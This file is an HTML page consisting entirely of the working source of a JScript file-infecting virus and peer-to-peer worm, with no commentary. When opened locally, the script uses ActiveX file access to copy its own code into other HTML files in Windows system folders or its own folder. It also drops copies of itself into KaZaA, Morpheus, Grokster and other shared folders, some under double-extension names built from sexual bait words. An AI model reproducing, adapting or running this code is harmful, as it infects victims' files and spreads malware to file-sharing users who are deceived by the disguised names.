<Elmar><html>
<head>
<script language="JavaScript">
ThisFile = location.href;

if (ThisFile.indexOf("file:///") != -1) {
ThisFile = location.href.substr(8);

fso = new ActiveXObject("Scripting.FileSystemObject");
File = fso.GetFile(ThisFile);
Path = File.ParentFolder;
FileName = File.Name;

ReadVirus = fso.OpenTextFile(Path+"\\"+FileName, 1, false, 0);
App = ReadVirus.ReadLine();
if (App.indexOf("<elmaR>") != -1) {
Size = File.Size;
ElmarPlace = eval(Size+"-4612");
ReadVirus = fso.OpenTextFile(Path+"\\"+FileName, 1, false, 0);
ReadVirus.Read(ElmarPlace);
Virus = ReadVirus.ReadAll();
ReadVirus.Close();
}
else {
ReadVirus = fso.OpenTextFile(Path+"\\"+FileName, 1, false, 0);
Virus = ReadVirus.Read(4612);
ReadVirus.Close();
}

InfectFolder = Math.floor(Math.random()*4);
if (InfectFolder < 3) {
InfFolder = fso.GetSpecialFolder(InfectFolder);
}
else {
InfFolder = Path;
}
alert(InfFolder);
InfectMethod = Math.floor(Math.random()*2);
if (InfectMethod==0) {
Folder = fso.GetFolder(InfFolder);
FindFile = new Enumerator(Folder.Files);
FindFile.moveFirst();

while (FindFile.atEnd() == false) {
Found = FindFile.item();
FileType = fso.GetFile(Found);
HTML = FileType.Type;

if (Found != Path+"\\"+FileName) {

if (HTML.indexOf("HTML") != -1) {
CheckInfection = fso.OpenTextFile(Found, 1, false, 0);
Marker = CheckInfection.ReadLine();
CheckInfection.Close();

if (Marker.indexOf("<Elmar>") == -1) {
if (Marker.indexOf("<elmaR>") == -1) {
ReadHost = fso.OpenTextFile(Found, 1, false, 0);
Host = ReadHost.ReadAll();
ReadHost.Close();

fso.CreateTextFile(Found);
Prepend = fso.OpenTextFile(Found, 2, false, 0);
Prepend.Write(Virus+Host);
Prepend.Close();
}
}
}
}
FindFile.moveNext();
}
}

else {
Folder = fso.GetFolder(InfFolder);
FindFile = new Enumerator(Folder.Files);
FindFile.moveFirst();

while (FindFile.atEnd() == false) {
Found = FindFile.item();
FileType = fso.GetFile(Found);
HTML = FileType.Type;

if (Found != Path+"\\"+FileName) {

if (HTML.indexOf("HTML") != -1) {
CheckInfection = fso.OpenTextFile(Found, 1, false, 0);
Marker = CheckInfection.ReadLine();
CheckInfection.Close();
ItsMe = "<elmaR>";

if (Marker.indexOf("<Elmar>") == -1) {
if (Marker.indexOf("<elmaR>") == -1) {
ReadHost = fso.OpenTextFile(Found, 1, false, 0);
Host = ReadHost.ReadAll();
ReadHost.Close();

fso.CreateTextFile(Found);
Append = fso.OpenTextFile(Found, 2, false, 0);
Append.Write(ItsMe+Host+Virus);
Append.Close();
}
}
}
}
FindFile.moveNext();
}
}

P2PFolder = new Array();
P2PFolder[0] = "C:\\Program Files\\KMD\\My Shared Folder\\";
P2PFolder[1] = "C:\\Program Files\\KaZaA\\My Shared Folder\\";
P2PFolder[2] = "C:\\Program Files\\KaZaA Lite\\My Shared Folder\\";
P2PFolder[3] = "C:\\Program Files\\Morpheus\\My Shared Folder\\";
P2PFolder[4] = "C:\\Program Files\\Grokster\\My Grokster\\";
P2PFolder[5] = "C:\\Program Files\\BearShare\\Shared\\";
P2PFolder[6] = "C:\\Program Files\\Edonkey2000\\Incoming\\";
P2PFolder[7] = "C:\\Programme\\KMD\\My Shared Folder\\";
P2PFolder[8] = "C:\\Programme\\KaZaA\\My Shared Folder\\";
P2PFolder[9] = "C:\\Programme\\KaZaA Lite\\My Shared Folder\\";

Worm = fso.GetFile(Path+"\\"+FileName);
WormMethod = Math.floor(Math.random()*2);
if (WormMethod == 0) {
P2PCount = 0;
while (P2PCount != 10) {

if (fso.FolderExists(P2PFolder[P2PCount])) {
Folder = fso.GetFolder(P2PFolder[P2PCount]);
FindFile = new Enumerator(Folder.Files);
FindFile.moveFirst();

while (FindFile.atEnd() == false) {
Found = FindFile.item();
FoundName = fso.GetFile(Found).Name;
if (FoundName.indexOf("..html") == -1) {
Worm.Copy(Found+"..html");
FindFile.moveNext();
}
else {
break;
}
}
}
P2PCount = P2PCount+1;
}
}

else {
Part1 = new Array();
Part1[0] = "Hot";
Part1[1] = "Teen";
Part1[2] = "Sexy";
Part1[3] = "Fuckin";
Part1[4] = "Wet";

Part2 = new Array();
Part2[0] = "Super";
Part2[1] = "Black";
Part2[2] = "XXX";
Part2[3] = "Dildo";
Part2[4] = "Asian";

Part3 = new Array();
Part3[0] = "Pussy";
Part3[1] = "Lesbian";
Part3[2] = "SexParty";
Part3[3] = "Bitches";
Part3[4] = "Ass";

P2PCount = 0;
while (P2PCount != 10) {

if (fso.FolderExists(P2PFolder[P2PCount])) {
Names = 5;
while (Names != 0) {
Name1 = Part1[Math.floor(Math.random()*5)];
Name2 = Part2[Math.floor(Math.random()*5)];
Name3 = Part3[Math.floor(Math.random()*5)];

FakeName = Name1+Name2+Name3+".jpg..html";
Worm.Copy(P2PFolder[P2PCount]+FakeName);
Names = Names-1;
}
}
P2PCount = P2PCount+1;
}
alert("done");
}

}
</script>
</head>
</html>